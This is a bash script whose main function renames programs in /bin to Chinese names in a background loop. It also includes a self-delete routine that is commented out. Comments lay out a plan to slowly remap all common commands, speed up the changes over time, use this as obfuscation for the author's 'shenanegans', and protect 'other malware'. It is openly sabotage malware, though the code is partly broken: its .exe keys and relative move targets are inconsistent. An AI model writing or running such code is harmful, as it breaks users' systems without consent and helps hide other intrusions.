#!/bin/bash

declare -A zhongwen
zhongwen["ls"]="列目录"
zhongwen["cd"]="去目录"
zhongwen["pwd"]="我再那儿"
zhongwen["whoami"]="我是谁"
zhongwen["ping"]="喂"
zhongwen["rm"]="删"
zhongwen["cp"]="复制"

declare -A CompatabilityDictionary
CompatabilityDictionary["ls.exe"]="列目录.exe"
#CompatabilityDictionary["cd"]="去目录"
CompatabilityDictionary["pwd"]="我再那儿"
CompatabilityDictionary["whoami"]="我是谁.exe"
CompatabilityDictionary["cat.exe"]="猫咪.exe"
#CompatabilityDictionary["man"]="人"
#CompatabilityDictionary["exit"]="离"
CompatabilityDictionary["vi.exe"]="视觉的.exe"
CompatabilityDictionary["vim.exe"]="更好的视觉的.exe"
CompatabilityDictionary["nano.exe"]="纳诺.exe"
CompatabilityDictionary["which.exe"]="那个.exe"
CompatabilityDictionary["clear.exe"]="清除.exe"

写中文() {
    echo "my dict ls is: ${zhongwen["ls"]}"
}

少写() {
    dir="/bin"
    for file in "$dir"/*; do
        if [ "${CompatabilityDictionary[${file:5}]+abc}" ]; then
            mv "$file" "${CompatabilityDictionary[${file:5}]}"
        fi
    done
}

慢写() {
    :
}

懒写() {
    :
}

去死() {
    rm -rf "$0"
}

main() {
    少写 &
    # 去死
}

main


# ls = 列目录 *
# cd = 去目录 *
# pwd = 我再那儿 *
# whoami = 我是谁 *
# echo = 说
# ping = 喂 or 喂喂
# rm = 删
# cp = 复制
# mv = 
# cat = 猫咪 *
# grep
# sudo
# git
# ssh
# scp
# touch
# locate
# less
# exit = 离
# kill = 杀
# killall = 都杀
# ss
# python
# python3
# chmod
# chown
# chgrp
# clear
# curl
# find = 找
# setfacl
# getfacl
# su
# passwd
# apt
# apt-get
# host
# hostname
# hostid
# hostname
# systemctl
# man 人 * 
# mkdir 
# nano = 纳诺 * 
# netcat
# nslookup
# openssl
# vi = 视觉的 *
# vim = 更好的视觉的 * 
# wget
# wc
#
# the plan
# slowly remap all common commands into chinese commands
# alternitively, this could be used as an obfuscator by aliasing all the commands with chinese characters for my future shenanegans
# remember to create a "redirect" binary
    # whenever someone types something in english, it says something like: "ls" not found. did you mean "看"?
    # or maybe not
# ramp up the change rate as time goes on
# for the future, allow the use of a one-time blacklist to protect other malware
